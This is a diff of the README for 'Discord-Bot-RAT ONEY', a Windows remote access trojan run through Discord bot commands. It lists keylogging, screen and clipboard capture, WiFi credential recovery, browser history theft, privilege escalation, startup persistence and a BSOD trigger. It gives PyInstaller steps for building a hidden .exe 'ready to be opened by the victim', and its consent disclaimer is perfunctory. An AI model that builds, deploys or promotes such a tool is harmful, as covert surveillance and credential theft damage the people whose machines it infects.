@@ -1,84 +1,100 @@
-https://img.shields.io/badge/python-3.8%252B-blue
-https://img.shields.io/badge/platform-windows-lightgrey
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
+# Discord-Bot-RAT ONEY
 
-A stealthy, feature-rich remote administration tool controlled entirely through Discord, designed for authorized system administration and security research.
+[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)](https://python.org)
+[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
+[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg?logo=gnu&logoColor=white)](https://www.gnu.org/licenses/gpl-3.0)
+[![Code Style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
 
-🔥 Features
-System Control
-Remote command execution (!exec)
+A remote Discord-based administration system.
 
-File system navigation (!ls, !cd, !download)
 
-Process management (via commands)
 
-Admin privilege escalation (!su)
+## 🌟 Feature Highlights
 
-Surveillance
-Live screen capture (!screen)
+### 🕵️‍♂️ Surveillance Module
+| Feature | Command | Preview |
+|---------|---------|---------|
+| Screen Capture | `!screen` | Screenshot |
+| Keylogger | `!log`/`!stoplog` | `[LOG] Keys: [Enter]T[E]S[T]` |
+| Clipboard | `!clipboard` | Copies current clipboard |
 
-Keylogging (!log, !stoplog)
+Runs in the background, sets itself to run at startup, checks if user is connected to the internet before running main code.
 
-Clipboard monitoring (!clipboard)
+### 💻 System Control
+```
+!exec ipconfig        # Remote command execution
+!su                   # Privilege escalation
+!persist              # Install persistence
+!bsod                 # Emergency trigger
 
-Browser history extraction (!recent)
+ Hardware Inventory
+!cpu                  # CPU specs
+!ram                  # Memory (GB) 
+!drives               # Storage analysis
 
-System Info
-Hardware inventory (CPU/GPU/RAM)
+ Network Recon
+!ip                   # IP address
+!wifi                 # Connected networks
+!dns                  # DNS configuration
 
-Network reconnaissance (IP/MAC/DNS)
+and more! (check below)
+```
+## 🚀 Deployment
 
-WiFi credential recovery
+Requirements
 
-Persistent access (Startup registration)
-
-Automation
-
-Multi-format deployment (.py/.pyw/.exe)
-
-Stealth operation (Hidden window)
-
-⚙️ Installation
-Prerequisites:
-
-Python 3.8+
 pip install -r requirements.txt
-Configuration:
 
-Replace TOKEN in oney.pyw with your Discord bot token
-
-Set desired command prefix
-
-Deployment Options:
-
-bash
-# As Python script
 python oney.pyw
 
-# As compiled executable (recommended)
-pyinstaller --onefile --windowed oney.pyw
-🛡️ Legal Disclaimer
-⚠️ This software is intended for authorized:
+File extension can be modified to:
+
+.py for console logs. (you need the requirements installed on the victims pc.)
+
+.pyw discrete. (you need the requirements installed on the victims pc.)
+
+.exe if you compile it with pyinstaller. (Recommended! no requirements or python needed, just an .exe file ready to be opened.)
+
+
+## Configuration
+Edit python file:
+
+
+  "token": "token"
+  
+   Replace token with your discord bot token. get it from https://discord.com/developers/applications
+
+## Production (Recommended)
+pip install pyinstaller
+
+pyinstaller --onefile --windowed --icon=assets/icon.ico oney.pyw
+
+This will generate a .exe file in the dist folder ready to be opened by the victim, no requirements or python needed to open it.
+
+
+# ⚖️ Legal Compliance
+
+Warning
+
+This tool is only for:
+
+Authorized pentesting
+
+Educational research
 
 System administration
 
-Penetration testing
+Document all consent before use.
+Violations may incur penalties under:
 
-Security research
+CFAA (18 U.S. Code § 1030)
 
-Educational purposes
+GDPR Article 5
 
-You must have explicit permission before deploying this tool on any system. Unauthorized use may violate:
+Local computer crime laws
 
-Computer Fraud and Abuse Act (CFAA)
+📜 Full Command Reference
 
-General Data Protection Regulation (GDPR)
-
-Other applicable local/international laws
-
-The developers assume no liability for misuse of this software.
-
-📜 Command Reference
     commands_list = [
         ('!screen', 'Capture and send a screenshot'),
         ('!ip', 'Get the IP address'),
@@ -113,23 +129,3 @@ The developers assume no liability for misuse of this software.
         ('!recent [browser]', 'Show recently visited websites'),
         ('!su', 'Request administrator privileges')
     ]
-🌐 Network Diagram
-Diagram
-Code
-
-
-
-
-
-
-📌 Notes
-Uses Discord's encrypted channels for communication
-
-Leaves minimal forensic traces
-
-Auto-removes temp files
-
-Tested on Windows 10/11
-
-📜 License
-GNU GPLv3 License - See LICENSE for details.
